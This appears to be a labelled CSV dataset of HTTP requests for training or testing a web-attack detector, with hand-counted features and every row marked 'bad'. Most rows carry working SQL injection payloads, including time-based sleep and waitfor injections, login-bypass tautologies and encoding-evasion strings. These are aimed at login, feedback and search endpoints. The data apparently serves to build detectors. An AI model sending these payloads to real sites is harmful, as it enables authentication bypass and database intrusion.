method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=hDP6qkUr&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=JyI=,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2%252527%252522&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,2,0,0,5,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1'""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
GET,/survey_questions.jsp?step=0JNQ53z8');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b350-350)&name=ckwiadcj&subject=1,0,0,0,1,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=lrhwetdo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b617-617-1=0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/index.jsp?content=-1%20OR%203%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI=,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
GET,/search.jsp?query=ZVfPGjyV,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b230-230-1=0%2b0%2b0%2b1%20or%20'naMQw5J7'=',4,0,0,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b364-364-1=0%2b0%2b0%2b1%20or%20'J7yAt4Ty'='&subject=1,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b537-537-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=3mdDgtu7';%20waitfor%20delay%20'0:0:6'%20--%20&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40Zh3Fi&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%5c,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%f0''%f0""""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1%20OR%202%2b747-747-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b204-204-1=0%2b0%2b0%2b1,0,0,0,0,2,1,bad
GET,/pr,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%f0''%f0""""",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b350-350)&name=ckwiadcj&subject=1,0,0,0,1,2,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst""%20AND%202*3*8=6*8%20AND%20""K4mi""=""K4mi&name=ckwiadcj&subject=1",0,4,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z",0,2,0,5,0,1,bad
GET,/index.jsp?content=-1%20OR%202%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
